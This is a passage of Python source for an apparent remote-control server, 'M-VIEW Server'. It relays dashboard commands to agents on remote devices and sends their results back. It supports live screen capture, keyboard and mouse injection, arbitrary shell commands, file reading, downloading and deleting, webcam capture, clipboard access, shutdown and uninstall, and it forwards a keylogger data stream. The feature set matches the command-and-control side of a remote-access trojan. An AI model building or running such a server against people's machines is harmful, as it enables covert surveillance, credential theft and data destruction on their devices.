    def on_cmd(data):
        did = data.get("device_id")
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, to=dev["sid"])
        log.info(f"Dashboard command → {did}: tab={data.get('tab')}")

    # ── Dashboard → Agent: start/stop/configure stream ──────────
    @sio.on("start_stream")
    def on_start_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":     "monitor",
                "action":  "start",
                "device_id": did,
                "fps":     data.get("fps", 20),
                "quality": data.get("quality", 55),
                "scale":   data.get("scale", 0.8),
                "mode":    data.get("mode", "video"),
                "monitor": data.get("monitor", 1),
            }, to=dev["sid"])

    @sio.on("stop_stream")
    def on_stop_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, to=dev["sid"])

    @sio.on("set_stream_mode")
    def on_set_stream_mode(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_mode",
                "mode": data.get("mode", "video"), "device_id": did,
            }, to=dev["sid"])

    @sio.on("set_quality")
    def on_set_quality(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_quality",
                "quality": data.get("quality", 55), "device_id": did,
            }, to=dev["sid"])

    # ── Dashboard → Agent: screenshot ───────────────────────────
    @sio.on("request_screenshot")
    def on_request_screenshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":       "screenshot",
                "quality":   data.get("quality", 60),
                "scale":     data.get("scale", 0.75),
                "device_id": did,
            }, to=dev["sid"])

    # ── Dashboard → Agent: mouse ────────────────────────────────
    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "mouse_event", **data}, to=dev["sid"])

    # ── Dashboard → Agent: scroll ───────────────────────────────
    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "scroll_event", **data}, to=dev["sid"])

    # ── Dashboard → Agent: keyboard ─────────────────────────────
    @sio.on("key_event")
    def on_key(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "key_event", **data}, to=dev["sid"])

    # ── Dashboard → Agent: ping ─────────────────────────────────
    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: disconnect screen ────────────────────
    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: system monitor ──────────────────────
    @sio.on("start_sysmon")
    def on_start_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "system", "action": "start",
                "interval": data.get("interval", 2), "device_id": did,
            }, to=dev["sid"])

    @sio.on("stop_sysmon")
    def on_stop_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system", "action": "stop", "device_id": did}, to=dev["sid"])

    @sio.on("request_snapshot")
    def on_snapshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system_snapshot", "device_id": did}, to=dev["sid"])

    @sio.on("request_disks")
    def on_disks(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "disks", "device_id": did}, to=dev["sid"])

    @sio.on("request_network")
    def on_network(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "network", "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: processes ────────────────────────────
    @sio.on("list_processes")
    def on_list_procs(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "processes", "device_id": did}, to=dev["sid"])

    @sio.on("kill_process")
    def on_kill_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "kill_process", "pid": data.get("pid"), "device_id": did}, to=dev["sid"])

    @sio.on("start_process")
    def on_start_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "start_process", "command": data.get("command", ""), "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: shell ─────────────────────────────────
    @sio.on("shell_command")
    def on_shell(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":        "shell",
                "command":    data.get("command", "echo hello"),
                "shell_type": data.get("shell_type", "cmd"),
                "device_id":  did,
            }, to=dev["sid"])

    # ── Dashboard → Agent: file browser ─────────────────────────
    @sio.on("file_list")
    def on_file_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_list", "path": data.get("path", "C:\\"), "device_id": did}, to=dev["sid"])

    @sio.on("file_read")
    def on_file_read(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_read", "path": data.get("path", ""), "device_id": did}, to=dev["sid"])

    @sio.on("file_download")
    def on_file_download(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_download", "path": data.get("path", ""), "device_id": did}, to=dev["sid"])

    @sio.on("file_delete")
    def on_file_delete(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_delete", "path": data.get("path", ""), "device_id": did}, to=dev["sid"])

    @sio.on("list_drives")
    def on_list_drives(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "drives", "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: webcam ─────────────────────────────
    @sio.on("webcam_capture")
    def on_webcam(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam", "camera": data.get("camera", 0), "device_id": did}, to=dev["sid"])

    @sio.on("webcam_list")
    def on_webcam_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: clipboard ───────────────────────────
    @sio.on("clipboard_get")
    def on_clip_get(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_get", "device_id": did}, to=dev["sid"])

    @sio.on("clipboard_set")
    def on_clip_set(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_set", "text": data.get("text", ""), "device_id": did}, to=dev["sid"])

    # ── Dashboard → Agent: power commands ──────────────────────
    @sio.on("power_command")
    def on_power(data):
        did = data.get("device_id", "")
        cmd = data.get("command", "")   # lock_screen | sleep | shutdown | restart | abort_shutdown
        with _dev_lock:
            dev = _devices.get(did)
        if dev and cmd in ("lock_screen", "sleep", "shutdown", "restart", "abort_shutdown"):
            sio.emit("request_action", {"tab": cmd, "device_id": did}, to=dev["sid"])
            log.info(f"Power command '{cmd}' → {did}")

    # ── Dashboard → Agent: uninstall ────────────────────────────
    @sio.on("uninstall_agent")
    def on_uninstall(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "uninstall", "device_id": did}, to=dev["sid"])

    # ══════════════════════════════════════════════════════════
    #  Agent → Dashboard relay handlers
    #  Every event from the agent is forwarded to all dashboard
    #  clients (skip_sid excludes the agent's own connection).
    # ══════════════════════════════════════════════════════════

    @sio.on("screen_data")
    def on_screen_data(data):
        out = dict(data)
        # Normalise field names — agent sends both 'frame' and 'image'
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        sio.emit("screenshot", out, skip_sid=request.sid)

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        sio.emit("screenshot", out, skip_sid=request.sid)

    @sio.on("ping_result")
    def on_ping_result(data):
        sio.emit("pong_agent", data, skip_sid=request.sid)

    @sio.on("cursor_event")
    def on_cursor(data):
        sio.emit("cursor_event", data, skip_sid=request.sid)

    @sio.on("system_stats_report")
    def _r_system(data):
        sio.emit("update_system_tab", data, skip_sid=request.sid)

    @sio.on("processes_report")
    def _r_procs(data):
        sio.emit("processes_result", data, skip_sid=request.sid)

    @sio.on("kill_result")
    def _r_kill(data):
        sio.emit("kill_result", data, skip_sid=request.sid)

    @sio.on("start_process_result")
    def _r_start_proc(data):
        sio.emit("start_process_result", data, skip_sid=request.sid)

    @sio.on("shell_result")
    def _r_shell(data):
        sio.emit("shell_result", data, skip_sid=request.sid)

    @sio.on("file_list_result")
    def _r_flist(data):
        sio.emit("file_list_result", data, skip_sid=request.sid)

    @sio.on("file_read_result")
    def _r_fread(data):
        sio.emit("file_read_result", data, skip_sid=request.sid)

    @sio.on("file_download_result")
    def _r_fdl(data):
        sio.emit("file_download_result", data, skip_sid=request.sid)

    @sio.on("file_delete_result")
    def _r_fdel(data):
        sio.emit("file_delete_result", data, skip_sid=request.sid)

    @sio.on("drives_report")
    def _r_drives(data):
        sio.emit("drives_report", data, skip_sid=request.sid)

    @sio.on("disks_report")
    def _r_disks(data):
        sio.emit("disks_report", data, skip_sid=request.sid)

    @sio.on("network_report")
    def _r_net(data):
        sio.emit("network_report", data, skip_sid=request.sid)

    @sio.on("webcam_result")
    def _r_webcam(data):
        sio.emit("webcam_result", data, skip_sid=request.sid)

    @sio.on("webcam_list_result")
    def _r_wcam_list(data):
        sio.emit("webcam_list_result", data, skip_sid=request.sid)

    @sio.on("keylog_data")
    def _r_keylog(data):
        sio.emit("keylog_data", data, skip_sid=request.sid)

    @sio.on("clipboard_data")
    def _r_clip(data):
        sio.emit("clipboard_data", data, skip_sid=request.sid)

    @sio.on("clipboard_result")
    def _r_clip_result(data):
        sio.emit("clipboard_result", data, skip_sid=request.sid)

    @sio.on("clipboard_set_result")
    def _r_clip_set(data):
        sio.emit("clipboard_set_result", data, skip_sid=request.sid)

    @sio.on("action_result")
    def _r_action(data):
        sio.emit("action_result", data, skip_sid=request.sid)

    # ══════════════════════════════════════════════════════════
    #  Watchdog background task
    #  Runs every 15s; marks devices offline if heartbeat silent
    # ══════════════════════════════════════════════════════════
    def _watchdog_loop():
        while True:
            time.sleep(15)
            now = datetime.datetime.utcnow()
            stale = []
            with _dev_lock:
                for did, dev in list(_devices.items()):
                    lb = dev.get("last_beat")
                    if lb:
                        try:
                            last = datetime.datetime.fromisoformat(lb.replace("Z", ""))
                            if (now - last).total_seconds() > HEARTBEAT_TIMEOUT:
                                stale.append(did)
                        except Exception:
                            pass
                for did in stale:
                    label = _devices[did].get("label", did)
                    del _devices[did]
                    log.warning(f"Watchdog: device silent — marking offline: {label} ({did})")
                    db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                    sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                    sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
            if stale:
                broadcast_device_update()

    sio.start_background_task(_watchdog_loop)

# ══════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════
def startup():
    log.info("=" * 65)
    log.info(f"  M-VIEW Server  v{VERSION}  (Render-ready + GitHub Releases)")
    log.info("=" * 65)
    local = Path(AGENT_DIR) / AGENT_FILE
    if local.is_file():
        log.info(f"  ✓ Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
    else:
        log.info(f"  — Agent (local):    not found — using GitHub Releases")
    log.info(f"  ✓ Agent (github):  {AGENT_STORAGE_URL}")
    log.info(f"  ✓ Supabase:         {SUPABASE_URL[:55]}")
    log.info(f"  ✓ SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
    log.info(f"  ✓ Port:             {PORT}")
    log.info(f"  ✓ Watchdog:         marks offline after {HEARTBEAT_TIMEOUT}s silence")
    log.info("=" * 65)
    log.info("  Render start command:")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
    log.info("             -w 1 --timeout 120 --bind 0.0.0.0:$PORT server:app")
    log.info("  Local dev:")
    log.info("    py -3.12 server.py")
    log.info("=" * 65)

# ══════════════════════════════════════════════════════════════
#  Entry point (local dev only — Render uses gunicorn)
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
